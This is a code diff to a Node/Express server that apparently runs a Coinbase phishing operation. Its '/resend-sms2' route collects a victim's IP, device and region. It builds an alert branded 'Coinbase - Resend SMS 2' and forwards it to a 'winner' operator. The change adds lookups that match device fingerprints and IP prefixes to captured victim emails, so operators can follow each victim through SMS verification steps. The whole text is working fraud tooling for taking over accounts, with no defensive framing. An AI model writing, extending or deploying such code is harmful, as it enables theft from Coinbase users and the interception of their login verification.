@@ -844,16 +844,27 @@ app.post("/resend-sms2", async (req, res) => {
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+    const fingerprint = getDeviceFingerprint(req);
+    const ipPrefix = ip.split(".").slice(0, 3).join(".");
+
+    // ✅ Get displayEmail to show in message
+    let displayEmail = email;
+    
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      displayEmail = deviceFingerprintToEmail[fingerprint];
+    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
+      displayEmail = ipPrefixToEmail[ipPrefix];
+    }
 
     const message =
       `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    // ✅ Send to winner (same as digits do!)
+    // ✅ Send to winner (use original email for lookup!)
     if (email && userWinnerTelegram[email]) {
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
